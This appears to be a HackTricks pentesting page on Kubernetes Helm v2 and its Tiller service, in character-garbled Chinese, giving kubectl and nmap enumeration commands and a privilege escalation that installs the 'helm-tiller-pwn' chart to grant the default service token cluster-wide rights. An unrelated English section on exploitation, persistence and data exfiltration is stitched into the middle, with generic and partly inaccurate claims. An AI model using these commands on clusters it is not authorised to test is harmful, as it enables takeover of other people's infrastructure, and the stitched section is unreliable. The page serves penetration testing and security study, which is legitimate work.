<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>


# åŸºæœ¬ä¿¡æ¯

Helmæ˜¯Kubernetesçš„**åŒ…ç®¡ç†å™¨**ã€‚å®ƒå…è®¸å°†YAMLæ–‡ä»¶æ‰“åŒ…å¹¶åˆ†å‘åˆ°å…¬å…±å’Œç§æœ‰ä»“åº“ä¸­ã€‚è¿™äº›åŒ…è¢«ç§°ä¸º**Helm Charts**ã€‚**Tiller**æ˜¯é»˜è®¤è¿è¡Œåœ¨ç«¯å£44134ä¸Šçš„**æœåŠ¡**ã€‚


**é»˜è®¤ç«¯å£ï¼š** 44134
```
PORT      STATE SERVICE VERSION
44134/tcp open  unknown
```
# æšä¸¾

å¦‚æœä½ å¯ä»¥**æšä¸¾ä¸åŒå‘½åç©ºé—´çš„Podå’Œ/æˆ–æœåŠ¡**ï¼Œè¯·æšä¸¾å®ƒä»¬å¹¶æœç´¢åç§°ä¸­å¸¦æœ‰**"tiller"**çš„å®ä¾‹ï¼š
```bash
kubectl get pods | grep -i "tiller"
kubectl get services | grep -i "tiller"
kubectl get pods -n kube-system | grep -i "tiller"
kubectl get services -n kube-system | grep -i "tiller"
kubectl get pods -n <namespace> | grep -i "tiller"
kubectl get services -n <namespace> | grep -i "tiller"
```
Examples:

## Reconnaissance

### Enumerate Tiller Service

To start the reconnaissance phase, we need to identify if the Tiller service is running on the target system. We can use the following command to check if the Tiller service is listening on the default port 44134:

```bash
nmap -p 44134 <target_ip>
```

If the Tiller service is running, we will see an open port 44134 in the scan results.

### Enumerate Tiller Releases

Once we have confirmed that the Tiller service is running, we can enumerate the available releases using the following command:

```bash
helm list
```

This command will display a list of all the releases managed by Tiller, along with their status, version, and other relevant information.

## Exploitation

### Exploit Tiller Service

If we have identified a vulnerable version of Tiller, we can exploit it to gain unauthorized access to the target system. One common vulnerability is the lack of authentication and authorization in older versions of Tiller.

To exploit this vulnerability, we can use the following command to establish a connection to the Tiller service:

```bash
helm init --client-only
```

This command will initialize the Helm client and establish a connection to the Tiller service. Once connected, we can use other Helm commands to interact with the target system.

### Exploit Tiller Releases

If we have identified a vulnerable release managed by Tiller, we can exploit it to gain unauthorized access to the target system. This can be done by leveraging known vulnerabilities in the specific release or misconfigurations in the deployment.

To exploit a vulnerable release, we need to first identify the specific version and any associated vulnerabilities. Once we have this information, we can use various techniques such as exploiting known vulnerabilities, privilege escalation, or lateral movement to gain unauthorized access.

## Post-Exploitation

### Maintain Access

After gaining unauthorized access to the target system, it is important to maintain access for future exploitation or data exfiltration. This can be achieved by creating a backdoor or establishing persistence mechanisms.

To maintain access, we can use techniques such as creating a new user account, modifying existing user accounts, or installing a remote access tool. These techniques will allow us to regain access to the target system even if our initial access is discovered and removed.

### Data Exfiltration

Once we have gained unauthorized access to the target system, we may want to exfiltrate sensitive data for further analysis or exploitation. This can be done by copying files, extracting databases, or using network protocols to transfer data to an external server.

To exfiltrate data, we need to identify the location of the sensitive data and the appropriate method for extraction. It is important to be cautious and minimize the impact on the target system to avoid detection.

## Conclusion

In this chapter, we have explored various techniques for pentesting Tiller and Helm. By performing reconnaissance, exploiting vulnerabilities, and maintaining access, we can gain unauthorized access to the target system and exfiltrate sensitive data. It is important to always follow ethical guidelines and obtain proper authorization before conducting any pentesting activities.
```bash
kubectl get pods -n kube-system
NAME                                       READY   STATUS             RESTARTS   AGE
kube-scheduler-controlplane                1/1     Running            0          35m
tiller-deploy-56b574c76d-l265z             1/1     Running            0          35m

kubectl get services -n kube-system
NAME            TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)                  AGE
kube-dns        ClusterIP   10.96.0.10     <none>        53/UDP,53/TCP,9153/TCP   35m
tiller-deploy   ClusterIP   10.98.57.159   <none>        44134/TCP                35m
```
æ‚¨è¿˜å¯ä»¥å°è¯•é€šè¿‡æ£€æŸ¥ç«¯å£44134æ¥æŸ¥æ‰¾è¯¥æœåŠ¡æ˜¯å¦æ­£åœ¨è¿è¡Œï¼š
```bash
sudo nmap -sS -p 44134 <IP>
```
ä¸€æ—¦ä½ å‘ç°äº†å®ƒï¼Œä½ å¯ä»¥é€šè¿‡ä¸‹è½½å®¢æˆ·ç«¯helmåº”ç”¨ç¨‹åºä¸ä¹‹é€šä¿¡ã€‚ä½ å¯ä»¥ä½¿ç”¨åƒ`homebrew`è¿™æ ·çš„å·¥å…·ï¼Œæˆ–è€…æŸ¥çœ‹[**å®˜æ–¹å‘å¸ƒé¡µé¢**](https://github.com/helm/helm/releases)**ã€‚**æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯æˆ–å…¶ä»–é€‰é¡¹ï¼Œè¯·å‚é˜…[å®‰è£…æŒ‡å—](https://v2.helm.sh/docs/using\_helm/#installing-helm)ã€‚

ç„¶åï¼Œä½ å¯ä»¥**æšä¸¾æœåŠ¡**ï¼š
```
helm --host tiller-deploy.kube-system:44134 version
```
## ææƒ

é»˜è®¤æƒ…å†µä¸‹ï¼Œ**Helm2**ä»¥**é«˜æƒé™**å®‰è£…åœ¨**kube-system**å‘½åç©ºé—´ä¸­ï¼Œå› æ­¤å¦‚æœæ‚¨æ‰¾åˆ°è¯¥æœåŠ¡å¹¶ä¸”å¯ä»¥è®¿é—®å®ƒï¼Œè¿™å°†å…è®¸æ‚¨**æå‡æƒé™**ã€‚

æ‚¨åªéœ€è¦å®‰è£…ä¸€ä¸ªç±»ä¼¼äºè¿™ä¸ªçš„è½¯ä»¶åŒ…ï¼š[**https://github.com/Ruil1n/helm-tiller-pwn**](https://github.com/Ruil1n/helm-tiller-pwn)ï¼Œå®ƒå°†ä½¿**é»˜è®¤æœåŠ¡ä»¤ç‰Œå¯ä»¥è®¿é—®æ•´ä¸ªé›†ç¾¤ä¸­çš„æ‰€æœ‰å†…å®¹**ã€‚
```
git clone https://github.com/Ruil1n/helm-tiller-pwn
helm --host tiller-deploy.kube-system:44134 install --name pwnchart helm-tiller-pwn
/pwnchart
```
åœ¨[http://rui0.cn/archives/1573](http://rui0.cn/archives/1573)ä¸­ï¼Œä½ å¯ä»¥æ‰¾åˆ°**æ”»å‡»çš„è§£é‡Š**ï¼Œä½†åŸºæœ¬ä¸Šï¼Œå¦‚æœä½ é˜…è¯»_helm-tiller-pwn/pwnchart/templates/_ç›®å½•ä¸‹çš„[**clusterrole.yaml**](https://github.com/Ruil1n/helm-tiller-pwn/blob/main/pwnchart/templates/clusterrole.yaml)å’Œ[**clusterrolebinding.yaml**](https://github.com/Ruil1n/helm-tiller-pwn/blob/main/pwnchart/templates/clusterrolebinding.yaml)æ–‡ä»¶ï¼Œä½ ä¼šçœ‹åˆ°**æ‰€æœ‰æƒé™éƒ½è¢«æˆäºˆäº†é»˜è®¤ä»¤ç‰Œ**ã€‚

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–æœ€æ–°ç‰ˆæœ¬çš„PEASSæˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricksä»“åº“](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloudä»“åº“](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
